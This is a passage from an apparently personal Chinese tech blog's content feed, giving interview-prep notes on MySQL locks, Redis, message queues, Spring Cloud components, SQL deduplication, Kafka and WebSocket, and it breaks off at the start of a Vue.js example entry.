title="六十八、Mysql锁有哪些"></a>六十八、Mysql锁有哪些</h3><p>按锁的粒度分类：</p><ol><li>行锁：锁某行数据，锁粒度最小，并发度高</li><li>表锁：锁整张表，锁粒度最大，并发度低</li><li>间隙锁：锁的是一个区间</li></ol><p>还可以分为：</p><ol><li>共享锁：也就是读锁，一个事务给某行数据加了读锁，其他事务也可以读，但是不能写</li><li>排它锁：也就是写锁，一个事务给某行数据加了写锁，其他事务不能读，也不能写</li></ol><p>还可以分为：</p><ol><li>乐观锁：并不会真正的去锁某行记录，而是通过一个版本号实现</li><li>悲观锁：上面说的表锁、行锁都是悲观锁</li></ol><h3 id="六十九、什么是RDB和AOF"><a href="#六十九、什么是RDB和AOF" class="headerlink" title="六十九、什么是RDB和AOF"></a>六十九、什么是RDB和AOF</h3><p><strong>RDB：</strong> Redis DataBase，在指定的时间间隔内将内存中的数据集快照写入磁盘，实际操作过程是fork一个字进程，先将数据集写入临时文件，写入成功后，再替换之前的文件，用二进制压缩存储</p><p>优点：</p><ol><li>整个Redis数据库将只包含一个文件dump.rdb，方便持久化</li><li>容灾性好，方便备份</li><li>性能最大化，fork子进程来完成写操作，让主进程继续处理命令，所以是IO最大化，使用单独字进程来进行持久化，主进程不会进行任何IO操作，保证了redis的高性能</li><li>相当于数据集大时，比AOF的启动效率更高</li></ol><p>缺点：</p><ol><li>数据安全性低，RDB是间隔一段时间进行持久化，如果持久化之间redis故障，会发生数据丢失。所以这种方式更适合数据要求不严谨的时候</li><li>由于RDB是通过fork子进程来协助完成数据持久化，所以在当数据集较大时，可能会导致整个服务器停止服务</li></ol><p><strong>AOF：</strong> Append Only File,以日志的形式记录服务器的每一个写、删除操作，查询操作不会记录，以文本的方式记录，可以打开文件看到详细的操作记录</p><p>优点：</p><ol><li>数据安全，Redis提供了三种同步策略，即每秒同步，每修改同步和不同步。事实上，每秒同步也是异步完成的，其效率也是非常高的，所差的是一旦系统出现宕机现象，那么这一秒钟之内修改的数据将丢失。而每修同步，我们可以视其为同步持久化，即每次发生的数据变化都会被立即记录到磁盘中</li><li>通过append模式写文件，即便中途服务器宕机也不会破坏已经存在的内容，可以通过redis-check-of工具解决数据一致性问题</li><li>AOF机制的rewrite模式，定期对AOF文件进行重写，以达到压缩目的</li></ol><p>缺点：</p><ol><li>AOF文件比RDB文件大，且恢复速度慢</li><li>数据集大的时候，比RDB启动效率低</li><li>运行效率没有RDB高</li></ol><p>AOF文件比RDB更新频率高，优先使用AOF还原数据，AOF比RDB更安全也更大，RDB性能比AOF好，如果两个都配了，优先加载AOF</p><h3 id="七十、Redis的过期键删除策略"><a href="#七十、Redis的过期键删除策略" class="headerlink" title="七十、Redis的过期键删除策略"></a>七十、Redis的过期键删除策略</h3><p>Redis是Key-value数据库，我们可以设置Redis中缓存的key的过期时间。Redis的过期策略就是指当Redis中缓存的Key过期了，Redis如何处理</p><ol><li>惰性过期：只有当访问一个key时，才会判断该key是否过期，过期则清除。这样可以最大化节省CPU，但是对内存非常不友好。极端情况容易出现大量过期可以没有被访问而不会被清除，占用大量内存</li><li>定期过期：每隔一定时间，会扫描一定数量的数据库的expires字典中一定数量的key，并清除其中已过期的key。该策略是一个折中方案。通过调整扫描的时间间隔和每次扫描的限定耗时，可以在不同情况下使得CPU和内存资源达到最好的平衡效果</li></ol><p>七十一、简述Redis事务实现</p><p>七十二、Redis主从复制的核心原理</p><h3 id="七十三、Redis有哪些数据结构？分别常用于什么什么场景？"><a href="#七十三、Redis有哪些数据结构？分别常用于什么什么场景？" class="headerlink" title="七十三、Redis有哪些数据结构？分别常用于什么什么场景？"></a>七十三、Redis有哪些数据结构？分别常用于什么什么场景？</h3><ol><li>String：可以用来做最简单的数据，可以缓存某个简单的字符串，也可以缓存某个JSON字符串。Redis分布式锁的实现就利用了这种数据结构，还包括可以实现计数器、Session共享、分布式ID</li><li>Hash：可以用来存储一些key-value对，更适合储存对象</li><li>list：Redis的列表通过命令的组合，既可以当做栈，也可以做队列来使用，可以用来缓存类似微型公众号、微博等消息流数据</li><li>set：和list类似，也可以存储多个元素，但是不能重复，集合可以进行并集、交集、差集等操作，从而实现我和某人共同关注的人，朋友圈点赞等功能</li><li>zset：有序集合，可以用来作排行榜</li></ol><h3 id="七十四、Redis分布式锁底层是如何实现的"><a href="#七十四、Redis分布式锁底层是如何实现的" class="headerlink" title="七十四、Redis分布式锁底层是如何实现的"></a>七十四、Redis分布式锁底层是如何实现的</h3><ol><li>首先利用setnx来保证：如果key不存在才能获取到锁，如果key存在则获取不到锁</li><li>然后利用lua脚本来保证多个Redis操作的原子性</li><li>同时还要考虑到锁过期，所以需要额外的一个看门狗定时任务来监听锁是否需要续约</li><li>同时还要考虑redis节点挂掉后的情况，所以需要采用红锁的方式来同时向N/2+1个节点申请锁，都申请到才证明取锁成功，这样就算其中某个Redis节点挂掉，锁也不会被其他客户端获取到</li></ol><h3 id="七十五、Redis集群策略"><a href="#七十五、Redis集群策略" class="headerlink" title="七十五、Redis集群策略"></a>七十五、Redis集群策略</h3><ol><li>主从模式：主库可以读写，并且和从库进行数据同步，从库负责读操作。客户端直接连主库或者某个从库，但是主库或者从库宕机后，客户端需要手动改IP</li><li>哨兵模式：在主从机制上增加了哨兵节点。当主库节点宕机后，哨兵会发现主库宕机了，然后从从库中选一个作为主库</li><li>Cluster模式：用的最多，支持多主多从，这种模式会按照key进行槽位的分配，可以使得不同的key分散到不同的主节点上，利用这种模式可以使整个集群支持更大的数据容量，同时主节点可以拥有自己的多个从节点，如果该主节点宕机，他会从他的从节点中选举有个新的主节点</li></ol><h3 id="七十六、缓存穿透、缓存雪崩、缓存击穿分别是什么"><a href="#七十六、缓存穿透、缓存雪崩、缓存击穿分别是什么" class="headerlink" title="七十六、缓存穿透、缓存雪崩、缓存击穿分别是什么"></a>七十六、缓存穿透、缓存雪崩、缓存击穿分别是什么</h3><ol><li>缓存雪崩：如果缓存中某一时刻大批热点数据过期，那么就可能导致大量请求直接访问Mysql。解决办法就是在过期时间上增加一点随机值。另外，搭建一个高可用的Redis集群也可以防止</li><li>缓存击穿：和缓存雪崩类似，但是缓存击穿是某一个热点数据失效，导致大量请求直接访问Mysql数据库。解决方法是，考虑这个热点是否不设置过期时间</li><li>缓存穿透：假如某一时刻访问Redis的大量key都不在redis中（例如黑客故意伪造的key），那么也会给数据造成压力，这就是缓存穿透。解决方案是接口层增加校验，比如用户鉴权，ID做基础校验，比如id&lt;=0直接拦截。如果数据库里也拿不到该数据，可以将该key-value写成key-null，设置有效时间，可以防止攻击者使用同一个id反复攻击</li></ol><h3 id="七十七、Redis如何和Mysql保持数据一致"><a href="#七十七、Redis如何和Mysql保持数据一致" class="headerlink" title="七十七、Redis如何和Mysql保持数据一致"></a>七十七、Redis如何和Mysql保持数据一致</h3><ol><li>先更新Mysql，再更新Redis，如果更新Redis失败，可能仍然不一致</li><li>先删除Redis缓存数据，再更新Mysql，再查询的时候，将数据添加到缓存中，但是在高并发下，性能低下，而且还是会出现数据不一致</li><li>延时双删：先删除Redis缓存数据，再更新Mysql，延迟几百毫秒再删除Redis缓存数据，这样就算在更新Mysql时，其他线程读了Mysql，把老数据读到Mysql中也会被删掉，从而保证数据一致</li></ol><h3 id="七十八、Redis的优缺点"><a href="#七十八、Redis的优缺点" class="headerlink" title="七十八、Redis的优缺点"></a>七十八、Redis的优缺点</h3><p>优点：</p><ol><li>读写性能优异</li><li>支持数据持久化</li><li>支持主从复制，主机会自动将数据同步到从机，可以进行读写分离</li></ol><p>缺点：</p><ol><li>不具备自动容错和恢复功能，主机从机宕机都会导致前端部分读写请求失败。</li><li>主机宕机，可能导致部分数据没有同步到从机，切换IP后，还容易引起数据不一致</li><li>Redis艰难支持在线扩容，在集群容量达到上限时，在线扩容会非常复杂</li></ol><h3 id="七十九、CAP理论，BASE理论"><a href="#七十九、CAP理论，BASE理论" class="headerlink" title="七十九、CAP理论，BASE理论"></a>七十九、CAP理论，BASE理论</h3><p>CAP：一致性，可用性和分区容错性，三者只能同时满足两个</p><p>八十、为什么Zookeeper可以用来做为注册中心</p><p>八十一、Zookeeper中领导者选举的流程是怎么样的</p><p>八十二、Zookeeper集群中节点之间数据是如何同步的</p><p>八十三、Dubbo支持哪些负载均衡策略</p><p>八十四、zk和eureka区别</p><h3 id="八十五、Spring-Cloud有哪些常用组件，作用是什么"><a href="#八十五、Spring-Cloud有哪些常用组件，作用是什么" class="headerlink" title="八十五、Spring Cloud有哪些常用组件，作用是什么"></a>八十五、Spring Cloud有哪些常用组件，作用是什么</h3><ol><li>Eureka：注册中心</li><li>Nacos：注册中心、配置中心（阿里巴巴的）</li><li>Consul：注册中心、配置中心</li><li>Spring cloud config： 配置中心</li><li>Feign/OpenFeign：RPC调用（远程服务调用）</li><li>zuul：服务网关</li><li>Spring cloud gateway：服务网关</li><li>Ribbon：负载均衡</li><li>Spring cloud sleuth：链路追踪</li><li>Zipkin：链路追踪</li><li>seata：分布式事务</li><li>Dubbo：RPC调用</li><li>Sentinel：服务熔断</li><li>Hystrix：服务熔断</li></ol><h3 id="八十六、RabbitMQ应用场景"><a href="#八十六、RabbitMQ应用场景" class="headerlink" title="八十六、RabbitMQ应用场景"></a>八十六、RabbitMQ应用场景</h3><ol><li>应用解耦：当要调用远程系统时，当存在订单系统和库存系统时，订单系统下单，库存系统需要收到订单后库存减一，这时候如果系统宕机，会造成订单丢失。但是把订单消息发入mq，库存系统再去mq消费，就能解决这个问题</li><li>异步消费：传统的模式：用户下单===&gt;邮件发送===&gt;短信提醒，三个步骤全部完成侧能返回用户消费成功，因为后面两个步骤完全没有当前就去完成，可以用户下单成功够，直接发送给mq，返回给用户消费成功，之后邮件发送和短信提醒，可以在其他时间段来消费法给用户</li><li>流量削峰：并发量非常高的时候，这时候数据库不能承受那么大的数据冲击，而专门为高并发设计的mq可以承受海量的请求，发送给mq，存储成功后再消费</li></ol><h3 id="八十七、什么是服务雪崩？什么是服务限流？"><a href="#八十七、什么是服务雪崩？什么是服务限流？" class="headerlink" title="八十七、什么是服务雪崩？什么是服务限流？"></a>八十七、什么是服务雪崩？什么是服务限流？</h3><ol><li>当服务A调用服务B，服务B调用服务C，此时大量的请求去请求服务A，假如服务A能抗住，但是服务C扛不住，导致大量的请求堆积，从而导致服务B请求堆积，从而服务A不可用，这就是服务雪崩。解决方法是服务降级和服务熔断</li><li>服务限流是指在高并发请求下，为保护系统，可以对访问服务的请求进行数量上的限制，从而防止系统不被大量请求压垮，在秒杀中，限流非常重要</li></ol><h3 id="八十八、什么是服务熔断？什么是服务降级？区别是什么？"><a href="#八十八、什么是服务熔断？什么是服务降级？区别是什么？" class="headerlink" title="八十八、什么是服务熔断？什么是服务降级？区别是什么？"></a>八十八、什么是服务熔断？什么是服务降级？区别是什么？</h3><ol><li>服务熔断是指，当服务A调用的某个服务B不可用时，上游服务A为了保证自己不受影响，从而不再调用服务B，直接返回一个结果，减轻服务A和服务B的压力，直到服务B恢复</li><li>服务降级指，当发现系统压力过载时，可以通过关闭某个服务，或者限流，某个服务来减轻系统压力</li></ol><p>相同点：</p><ol><li>都是为了防止系统崩溃</li><li>都是让用户体验到某些功能暂时不可用</li></ol><p>不同点：熔断是下游服务触发的，降级是降低系统负载</p><h3 id="八十九、kafka和RabbitMQ的区别"><a href="#八十九、kafka和RabbitMQ的区别" class="headerlink" title="八十九、kafka和RabbitMQ的区别"></a>八十九、kafka和RabbitMQ的区别</h3><ol><li>架构：RabbitMQ是一个消息代理，而Kafka是一个分布式流平台</li><li>实现：RabbitMQ基于队列模型，kafka基于发布/订阅模型</li><li>吞吐量：Kafka吞吐量远大于RabbitMQ，因为它具有分布式架构</li><li>持久性：Kafka消息储存更长</li><li>可靠性：RabbitMQ提供更高的可靠性，因为他支持事务和可靠性投递</li><li>用途：RabbitMQ用于异步通信和任务队列，Kafka适于大规模数据处理，和实时流数据</li></ol><p>九十、项目中怎么保证微服务敏捷开发</p><h3 id="九十一、如何进行消息队列选型"><a href="#九十一、如何进行消息队列选型" class="headerlink" title="九十一、如何进行消息队列选型"></a>九十一、如何进行消息队列选型</h3><p><strong>kafka：</strong></p><ol><li>优点：吞吐量大，性能非常好，集群高可用</li><li>缺点：会丢失数据，功能比较单一</li><li>使用场景：日志分析、大数据采集</li></ol><p><strong>RabbitMQ：</strong></p><ol><li>优点：消息可靠性高，功能全面</li><li>缺点：吞吐量低，消息积累会严重影响性能，erlang语言不好定制</li><li>使用场景：小规模场景</li></ol><p><strong>RocketMQ：</strong></p><ol><li>优点：高吞吐，高性能、高可用，功能全面</li><li>缺点：开源版本不如云上商业版，官方文档和周边生态不够成熟，客户端只支持java</li><li>使用场景：几乎是全场景</li></ol><h3 id="九十二、消息队列如何保证消息可靠性"><a href="#九十二、消息队列如何保证消息可靠性" class="headerlink" title="九十二、消息队列如何保证消息可靠性"></a>九十二、消息队列如何保证消息可靠性</h3><p>消息可靠传输代表两层意思，既不能多，也不能少。</p><ol><li>为了保证消息不多发，也就是消息不重复，也就是生产者不能重复生产消息，或者消费者不重复消费消息</li><li>首先要保证消息不多发，这个出现的比较少，也不好控制，因为出现了多发，很大原因是生产者自己的原因，如果要避免出现问题，就需要在消费端做控制</li><li>要避免不重复消费，最保险的机制就是消费者实现幂等性，保证就算重复消费，也不会有问题，通过幂等性，也能解决生产者重复发送消息的问题</li><li>消息不能少，意思就是消息不能丢，生产者发送的消息，消费者一定要消费到，对于这个问题，要考虑两个方面</li><li>生产者发送消息时，要确认broker确实收到并持久化了这条消息，比如RabbitMQ中的confirm机制，kafka的ack机制都可以保证生产者能正确的将消息发送给broker</li><li>broker要等待消费者真正确认消费到了消息时才能删掉信息，这里通常就是消费端的ack机制，消费者接收到一条消息后，如果确认没问题了，就可以给broker发送一个ack，broker接收到后才会删除消息</li></ol><h3 id="九十三、RabbitMQ的五种模式"><a href="#九十三、RabbitMQ的五种模式" class="headerlink" title="九十三、RabbitMQ的五种模式"></a>九十三、RabbitMQ的五种模式</h3><ol><li><p><strong>简单队列：</strong></p><p>一个生产者对应一个消费者</p></li><li><p><strong>work模式：</strong></p><p>一个生产者对应多个消费者，但是一条消息只有一个消费者可以获取消息</p></li><li><p><strong>发布/订阅模式：</strong></p><p>一个生产者将消息首先发送到交换器，交换器绑定到多个队列，然后被监听该队列的消费者所接受并消费</p></li><li><p><strong>路由模式：</strong></p><p>生产者将消息发送到direct交换器，在绑定队列和交换器的时候有一个路由key，生产者发送的消息会指定一个路由Key，那么消息只会发送到相应Key相同的队列，接着监听该队列的消费者消费信息</p><p><strong>也就是让消费者有选择性的接收消息</strong><br>路由模式，是以路由规则为导向，引导消息存入符合规则的队列中。再由队列的消费者进行消费的。</p></li><li><p><strong>主题模式：</strong></p><p>上面的路由模式是根据路由key进行完整的匹配（完全相等才发送消息），这里的通配符模式通俗的来讲就是模糊匹配。</p><p>符号“#”表示匹配一个或多个词，符号“*”表示匹配一个词。<br>　　与路由模式相似，但是，主题模式是一种模糊的匹配方式。</p><p>​</p></li></ol><h3 id="九十四、死信队列是什么？延时队列是什么？"><a href="#九十四、死信队列是什么？延时队列是什么？" class="headerlink" title="九十四、死信队列是什么？延时队列是什么？"></a>九十四、死信队列是什么？延时队列是什么？</h3><ol><li>死信队列也是一个消息队列，他是用来存那些没有成功消费的信息的，通常可以用作消息重试</li><li>延时队列就是用来存放需要在指定时间被处理的元素对队列，通常可以用来处理一些具有过期性操作的业务，比如十分钟内未支付取消订单</li></ol><p>九十五、MQ如何保证消息高效读写</p><h3 id="九十六、servlet的生命周期？"><a href="#九十六、servlet的生命周期？" class="headerlink" title="九十六、servlet的生命周期？"></a>九十六、servlet的生命周期？</h3><p>servlet有良好的生命周期定义，包括加载和实例化、初始化、处理请求以及服务结束四个阶段。WEB容器加载Servlet，生命周期开始，首先服务器调用Servlet的构造方法执行实例化操作，然后容器调用Servlet的init方法执行初始化操作，请求到达时运行Servlet的service方法，service方法自动调用与请求类型对应的doGet或者doPost方法来处理请求，当服务器决定将Servlet实例销毁前调用其destroy方法（释放servlet占用的资源，例如流、数据库连接等）</p><h3 id="九十七、跨域请求是什么？有什么问题？怎么解决？"><a href="#九十七、跨域请求是什么？有什么问题？怎么解决？" class="headerlink" title="九十七、跨域请求是什么？有什么问题？怎么解决？"></a>九十七、跨域请求是什么？有什么问题？怎么解决？</h3><p>跨域请求是指浏览器发起网络请求时，会检查该请求所对应的协议、域名、端口和当前网页是否一致，如果不一致则导致浏览器进行限制，比如在www.baidu.com的某个网页中，如果使用ajax去访问www.jd.com是不行的，但是如果是img、iframe、script等标签的src属性去访问则是可以的。之所以做这层限制，是为了用户信息安全。</p><p>解决方法：</p><ol><li>response添加header</li><li>jsonp的方式，该技术底层是基于script标签实现</li><li>后台自己控制</li><li>网关</li></ol><h3 id="九十八、乐观锁和悲观锁"><a href="#九十八、乐观锁和悲观锁" class="headerlink" title="九十八、乐观锁和悲观锁"></a>九十八、乐观锁和悲观锁</h3><ol><li><strong>悲观锁：</strong>每次去拿数据的时候都认为会进行修改，所以每次再拿数据的时候都会上锁。但是这样别人去拿数据就会被挡住，直到悲观锁释放。悲观锁中的共享资源每次只能给一个线程使用，其他线程阻塞，用完之后再把资源转让给其他线程。效率和并行性较低，还会增加死锁的风险。数据库中的行锁、表锁、读锁（共享锁）、写锁（排它锁），以及syncronized实现的锁均为悲观锁</li><li><strong>乐观锁：</strong> 每次去拿数据都认为不会修改，所以不会上锁，但是如果想要更新数据，则会在更新前检查在读取至更新这段时间别人有没修改过这个数据。如果修改过，就重新读取，然后尝试更新，循环上述步骤，直至更新成功。适用于多读的应用类型，可以提高吞吐量</li></ol><p>九十九、零拷贝是什么</p><p>一百、常见设计模式</p><h1 id="SQL面试题"><a href="#SQL面试题" class="headerlink" title="SQL面试题"></a>SQL面试题</h1><h3 id="一、什么是分库分表？以及他的应用场景"><a href="#一、什么是分库分表？以及他的应用场景" class="headerlink" title="一、什么是分库分表？以及他的应用场景"></a>一、什么是分库分表？以及他的应用场景</h3><p>分库分表是一种数据库技术，它可以将数据库中的数据按照一定的规则进行分割，将数据存储到不同的数据库中，以提高数据库的<strong>性能</strong>和<strong>可用性</strong>。</p><p><strong>应用场景：</strong></p><ol><li>当<strong>数据量</strong>较大时，可以将数据分散到多个数据库中，以提高查询性能；</li><li>当<strong>数据库访问量</strong>较大时，可以将数据分散到多个数据库中，以提高访问性能；</li><li>当<strong>数据库容量较大</strong>时，可以将数据分散到多个数据库中，以提高存储性能。</li></ol><h3 id="二、left-join和right-join的区别"><a href="#二、left-join和right-join的区别" class="headerlink" title="二、left join和right join的区别"></a>二、left join和right join的区别</h3><p>LEFT JOIN和RIGHT JOIN的区别在于连接结果中左表和右表的位置不同。</p><p>LEFT JOIN会返回左表中的所有记录，即使右表中没有对应的匹配。如果右表中如果没有对应的匹配，右表的字段将被赋值为NULL。RIGHT JOIN则与之相反。</p><p>另外，在大部分数据库系统中，支持使用LEFT JOIN和RIGHT JOIN两种语句，并且两种操作是等价的，所以也可以使用 JOIN 替代LEFT JOIN 或 RIGHT JOIN</p><h3 id="三、数据库优化"><a href="#三、数据库优化" class="headerlink" title="三、数据库优化"></a>三、数据库优化</h3><ol><li><p><strong>架构优化：</strong> </p><ol><li><p><strong>分布式缓存：</strong>性能不够，缓存来凑。我们可以在应用于数据库之间加一个缓存服务，比如Redis。当收到查询请求后，我们先查询缓存，判断缓存中是否有数据，有数据则直接返回给应用，如若没有再查数据库。大大减少了对数据库的访问次数，自然提高了性能。</p><p>但是需要注意引入Redis之后的缓存穿透、缓存击穿和缓存雪崩</p></li><li><p><strong>读写分离：</strong>一主多从，读写分离，主动同步。一般来说，当你的应用是读多写少，数据库压力过大，采用读写分离，通过增加数据库量可以线性提升系统<strong>读</strong>性能**</p><p><strong>主库，提供数据库写服务；从库，提供数据库读能力；主从之间，通过binlog同步数据</strong></p><p>实施读写分离时，为了保证高可用，需要实现故障的自动转移，主从架构会有潜在主从不一致的问题</p></li><li><p><strong>分库分表（水平切分）：</strong>当你的应用业务数据量很大，单库容量成为性能瓶颈后，采用水平切分，可以降低数据库单库容量，提升数据库写性能。</p><p>当准备实施水平切分时，需要结合实际业务选取合理的分片键</p></li></ol></li><li><p><strong>硬件优化：</strong> 不管是读操作还是写操作，都是要访问磁盘，所以磁盘的性能决定了数据库的性能。用好的就行</p></li><li><p><strong>DB优化：</strong> SQL执行慢有时候不一定完全是SQL问题，手动安装一台数据库而不做任何参数调整，再怎么优化SQL都无法让其性能最大化。</p><p>基本遵循以下三点：日志不能小、缓存足够大、连接要够用</p></li><li><p><strong>SQL优化：</strong></p><ol><li><p><strong>合理使用索引:</strong></p><p>索引少了查询慢；索引多了占用空间大，执行增删改语句的时候需要动态维护索引，影响性能</p></li><li><p><strong>使用UNION ALL替代UNION：</strong></p><p>UNION ALL的执行效率比UNION高，因为UNION执行时需要排重；</p></li><li><p><strong>避免使用select :</strong></p><p>执行SQL时优化器需要将 * 转成具体的列；每次查询都要回表，不能走覆盖索引。</p></li><li><p><strong>JOIN字段建立索引</strong></p></li><li><p><strong>避免复杂的SQL语句:</strong></p><p>提升可阅读性；避免慢查询的概率；可以转换成多个短查询，用业务端处理</p></li><li><p><strong>避免where 1= 1写法</strong></p></li><li><p><strong>避免order by rand()类似写法:</strong></p><p>RAND()导致数据列被多次扫描</p></li></ol></li></ol><h3 id="四、怎么进行去重查询？"><a href="#四、怎么进行去重查询？" class="headerlink" title="四、怎么进行去重查询？"></a>四、<strong>怎么进行去重查询？</strong></h3><ol><li><p><strong>distinct：</strong>效率较低。不适合用来展示去重后具体的值，一般用于计算</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 列出 task_id 的所有唯一值（去重后的记录）</span></span><br><span class="line"><span class="comment">-- select distinct task_id</span></span><br><span class="line"><span class="comment">-- from Task;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 任务总数</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="keyword">distinct</span> task_id) task_num</span><br><span class="line"><span class="keyword">from</span> Task;</span><br></pre></td></tr></table></figure><p>​</p></li><li><p><strong>group by ：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 列出 task_id 的所有唯一值（去重后的记录,null也是值）</span></span><br><span class="line"><span class="comment">-- select task_id</span></span><br><span class="line"><span class="comment">-- from Task</span></span><br><span class="line"><span class="comment">-- group by task_id;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 任务总数</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(task_id) task_num</span><br><span class="line"><span class="keyword">from</span> (<span class="keyword">select</span> task_id</span><br><span class="line">      <span class="keyword">from</span> Task</span><br><span class="line">      <span class="keyword">group</span> <span class="keyword">by</span> task_id) tmp;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​</p></li><li><p><strong>row_number：</strong>窗口函数，用的比较少，因为必须先支持窗口函数才行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 在支持窗口函数的 sql 中使用</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="keyword">case</span> <span class="keyword">when</span> rn<span class="operator">=</span><span class="number">1</span> <span class="keyword">then</span> task_id <span class="keyword">else</span> <span class="keyword">null</span> <span class="keyword">end</span>) task_num</span><br><span class="line"><span class="keyword">from</span> (<span class="keyword">select</span> task_id</span><br><span class="line">      , <span class="built_in">row_number</span>() <span class="keyword">over</span> (<span class="keyword">partition</span> <span class="keyword">by</span> task_id <span class="keyword">order</span> <span class="keyword">by</span> start_time) rn</span><br><span class="line">  <span class="keyword">from</span> Task) tmp;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​</p></li></ol><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h3 id="kafka相关知识点"><a href="#kafka相关知识点" class="headerlink" title="kafka相关知识点"></a>kafka相关知识点</h3><p>kafka是一种消息队列，主要用来处理大量数据状态下的消息队列，一般用来做日志处理</p><p>优点：</p><ol><li><p>解耦合：</p><p>耦合的状态表示当你实现新功能时，是直接接入当前接口，可以将相应消息发送到消息队列，这样的话，如果接口出问题，将不会影响到当前的功能</p></li><li><p>异步处理：</p><p>异步处理替代了之前的同步处理，异步处理不需让流程走完就返回结果，可以将消息发送到消息队列中，然后返回结果，剩下让其他业务处理，接口从消息队列中拉去消息处理即可</p></li><li><p>流量削峰</p><p>高流量的时候，使用消息队列作为中间件可以将流量的高峰保存在消息队列中，从而防止系统的高请求</p></li></ol><p>消费模式：</p><ol><li>一对一：消费者发布消息到Queue队列中，通知消费者从队列中拉取消息进行消费。消息消费后就删除，Queue支持多个消费者，但是一条消息只能被一个消费者消费</li><li>一对多：也叫发布/订阅模式，即利用Topic存储消息，消息生产者将消息发布到Topic中，同时有多个消费者订阅此Topic，消费者可以从中消费消息，注意，发布到Topic中的消息将会被多个消费者消费。消费者消费数据之后，数据不会被消除，kafka会默认保留一段时间，然后再删除</li></ol><h3 id="WebSocket是什么？应用场景"><a href="#WebSocket是什么？应用场景" class="headerlink" title="WebSocket是什么？应用场景"></a>WebSocket是什么？应用场景</h3><p>WebSocket是一种网络传输协议，位于OSI模型的应用层，可在单个TCP连接上进行全双工通信，能更好的节省服务器资源和带宽</p><p>客户端和服务器只需完成一次握手，两者就可以创建持久性的连接，并进行双向数据传输</p><p>优点：</p><ol><li>较少的开销：数据包头部协议较小，不同于HTTP每次请求都需要携带完整的头部</li><li>更强的实时性：相对于HTTP，延时更少</li><li>保持创连接状态：创建通信后，可省略状态信息，不同于HTTP每次请求需要携带身份验证</li><li>支持扩展：用户可以扩展webSocket协议，实现部分自定义的子协议</li></ol><p>缺点：</p><ol><li>各浏览器的支持度不同</li><li>服务器维持长连接的成本高</li><li>webSocket是长连接，受网络影响很大，需要处理好重连</li></ol><p>应用场景：</p><ol><li>弹幕</li><li>媒体聊天</li><li>协同编辑</li><li>基于位置的应用</li><li>体育实况</li><li>股票基金报价的实时更新</li></ol>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue实例</title>
      <link href="/2023/01/01/vue%E5%AE%9E%E4%BE%8B/"/>
      <url>/2023/01/01/vue%E5%AE%9E%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<p>vue实例就是你new出来的vue对象</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2.5.16/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;a&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> data = &#123;<span class="attr">a</span>:<span class="number">1</span>&#125;</span></span><br><span class="line"><span class="language-javascript"><span 